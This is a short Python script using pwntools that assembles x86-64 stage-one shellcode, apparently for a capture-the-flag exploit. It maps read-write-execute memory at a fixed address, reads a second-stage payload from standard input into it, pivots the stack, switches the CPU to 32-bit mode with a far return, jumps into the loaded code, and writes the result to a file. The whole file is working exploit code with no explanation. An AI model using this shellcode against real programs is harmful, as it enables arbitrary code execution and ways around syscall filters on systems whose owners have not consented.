from pwn import * 
context.arch='amd64'

def f(sc):
	return asm(sc, os='linux', arch='amd64')

# read(0, 0x40404040, 0x1010) ax=0
read = f('''
mov rsi, 0x40404040;
pushw 0x1010;
pop rdx;
xor rdi, rdi;
xor rax, rax;
syscall;
''')
print("read: ", read)

# mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9
mmap = f('''
mov rdi, 0x40404040;
push 0x7f;
pop rsi;
push 7;
pop rdx;
push 34;
pop rcx;
xor r8, r8;
xor r9, r9;
push 9;
pop rax;
syscall;
''')
print("mmap: ", mmap)

rsp = f('''
mov rsp, 0x40404f40
''')
print("rsp", rsp)

to32 = f('''
push 0x23;
push 0x40404040;
retfq
''')
print("to32", to32)

ret = f('''
push 0x40404040
ret
''')

sh1 = mmap + read + rsp + to32

sh = mmap + read + ret

fo = open("shellcode", "wb")
fo.write(sh)
 
fo.close()
